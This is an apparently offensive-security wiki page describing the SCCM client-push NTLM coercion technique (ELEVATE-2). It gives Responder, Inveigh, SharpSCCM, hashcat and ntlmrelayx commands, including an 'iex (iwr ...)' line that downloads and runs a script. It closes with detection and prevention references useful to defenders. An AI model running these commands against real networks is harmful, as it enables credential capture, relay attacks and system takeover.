# ELEVATE-2 - Client Push

## Document Reference

* [ELEVATE-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-2/ELEVATE-2\_description.md)

## Description

It is possible to coerce NTLM authentication from a site servers push installation account and machine account. The NTLM authentication can either be cracked offline or relayed elsewhere for authentication.

## Requirements

* SCCM automatic site assignment and automatic client push installation are enabled
* PKI certificates aren’t required for client authentication
* SMB Signing disabled (If relaying authentication)
* Domain user credentials
* Local Administrator (If performing from Windows)
* Fallback to NTLM authentication is not explicitly disabled (default)



## Credential Capture

### Setup capture

{% tabs %}
{% tab title="Windows" %}
Setup Inveigh or Invoke-Inveigh to sniff for network traffic (Local Admin Required)

```powershell
# Binary
Inveigh.exe

# Download
iex (iwr -usebasicparsing https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)

# Execute
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y -HTTPS Y -IP [Local IP>
```
{% endtab %}

{% tab title="Linux" %}
Set up Responder to listen for network traffic in analyse mode.

```python
# Responder
sudo python3 /usr/share/Responder.py -I [Interface] -A
```
{% endtab %}
{% endtabs %}

### Trigger client push installation

Trigger the client push on the site server, targeting the listening host. This process may take a couple of minutes to capture

```powershell
# SharpSCCM
SharpSCCM.exe invoke client-push -sms [SMS Site IP] -sc [Site Code] -t [Listening IP]
```

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### hashcat

```
hashcat.exe -m 5600 -a 0 -o hash.txt Wordlists\kaonashi14M.txt rules\best64.rule
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Relay Authentication

### ntlmrelayx Setup

{% tabs %}
{% tab title="Windows" %}
Before setting up ntlmrelayx on Windows we need to divert SMB traffic on port 445 to an alternate port such as 8445 with divertTCPConn (Local Administrator Required)

```
divertTCPconn.exe 445 8445
```

Configure ntlmrelayx

```powershell
ntlmrelayx.exe --smb-port 8445 -smb2support --smb-port 8445 -ts -t [Relay Target]
```
{% endtab %}

{% tab title="Linux" %}
```python
impacket-ntlmrelayx -smb2support -ts -ip [Interface IP] -t [Relay Target]
```
{% endtab %}
{% endtabs %}

Trigger Push authentication then wait a minute or two to capture the authentication request.

```powershell
SharpSCCM.exe invoke client-push -sms [Site Server] -sc [Site Code] -t [Relay IP]
```

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

**Getting full shells on Windows**

The below page demonstrates how to get full shells on Windows with Amnesiac and ntlmrelayx.

{% content-ref url="takeover-2.md" %}
[takeover-2.md](takeover-2.md)
{% endcontent-ref %}

###

### Defensive IDs

* [DETECT-1: Monitor site server domain computer accounts authenticating from another source](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/DETECT/DETECT-1/detect-1\_description.md)
* [DETECT-3: Monitor client push installation accounts authenticating from anywhere other than the primary site server](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/DETECT/DETECT-3/detect-3\_description.md)
* [PREVENT-1: Patch site server with KB15599094](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-1/prevent-1\_description.md)
* [PREVENT-2: Disable Fallback to NTLM](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-2/prevent-2\_description.md)
* [PREVENT-5: Disable automatic side-wide client push installation](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-5/prevent-5\_description.md)
* [PREVENT-8: Require PKI certificates for client authentation](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-8/prevent-8\_description.md)
* [PREVENT-11: Disable and uninstall WebClient on site servers](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-11/prevent-11\_description.md)
* [PREVENT-12: Require SMB signing on site systems](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-12/prevent-12\_description.md)
